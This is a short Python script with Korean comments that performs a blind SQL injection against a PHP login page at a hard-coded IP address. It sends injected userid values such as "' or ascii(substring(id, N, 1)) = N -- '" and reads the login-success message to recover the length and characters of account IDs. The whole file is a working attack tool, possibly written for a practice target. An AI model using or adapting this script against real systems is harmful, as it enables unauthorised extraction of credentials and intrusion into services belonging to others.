# -*- coding: utf-8 -*-
import requests, json

#블라인드 sql 인젝션 할 url
url = 'http://104.197.42.200/member/login_ok.php'

#아이디 길이 구하기
def find_id_len():
    id_len = 0
    while 1:
        id_len = id_len + 1
        value = "' or char_length(id) = {} -- '".format(id_len)
        datas = {
            'userid' : value,
            'userpw' : 'password' #패스워드에 임의의 문자 넣기
            }
        print(datas)
        response = requests.post(url, data = datas) #post 요청
        print(response.text)
        #print(response.status_code)
        #print(value)
        
        #if "패스워드가 다릅니다!" in response.text.encode('utf-8') :
        test = "로그인 성공"
        if test.encode() in response.text.encode('utf-8') :
            break
    return id_len

#아이디 길이를 바탕으로 문자열 알아내기
def find_id_str(id_len):
    id_str = ""
    for len in range(1, id_len+1):
        for ascii in range(97, 123):
            value = "' or ascii(substring(id, {}, 1)) = {} -- '".format(len, ascii)
            datas = {
                'userid' : value,
                'userpw' : 'password' #패스워드에 임의의 문자 넣기
                }
            response = requests.post(url, data = datas) #post 요청
            #print(response.status_code)
            #print(value)
            #print(response.text.encode('utf-8'))
            test = "로그인 성공"
            if  test.encode() in response.text.encode('utf-8'):
                id_str+=chr(ascii)+":"
        id_str+="\n"
    return id_str


if __name__ == '__main__':
    print("아이디 조합 : \n" + str(find_id_str(find_id_len())))
